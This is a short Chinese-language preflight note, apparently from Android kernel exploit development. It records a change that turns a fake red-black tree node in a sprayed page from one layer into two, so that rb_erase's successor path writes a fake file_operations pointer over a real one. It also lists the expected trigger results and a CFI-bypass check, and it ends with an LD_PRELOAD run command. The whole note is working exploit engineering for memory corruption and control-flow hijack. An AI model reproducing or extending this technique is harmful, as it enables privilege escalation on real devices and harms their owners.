# v30 Path C 深度 successor 修复 — Preflight 2026-07-15

## 改动
util.c: SCRATCH_OFF fake rb_node 从单层改为两层

### 原来 (v28/v29 Path C)
```
SCRATCH_OFF:
  left=NULL → successor=自己
  rb_erase: parent=successor → 写回 sprayed page → 空操作!
```

### 改后 (v30)
```
SCRATCH_OFF (中间节点):
  left=SUCCESSOR_OFF → 有左子 → successor 更深
SUCCESSOR_OFF (SCRATCH_OFF+0x40):
  left=NULL → 这就是 successor
  parent_color=FOPS-8|RED → rb_erase parent=FOPS-8 → parent->rb_right=FOPS!
  rb_right=fake_fops → [FOPS]=fake_fops ✅
```

## 预期
- 保持 tree_entry=OFF|RED (强触发 ret=150+)
- Path C successor erase 写 fake_fops 到 FOPS
- try_cfi_stage 验证通过

## 运行命令
LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10
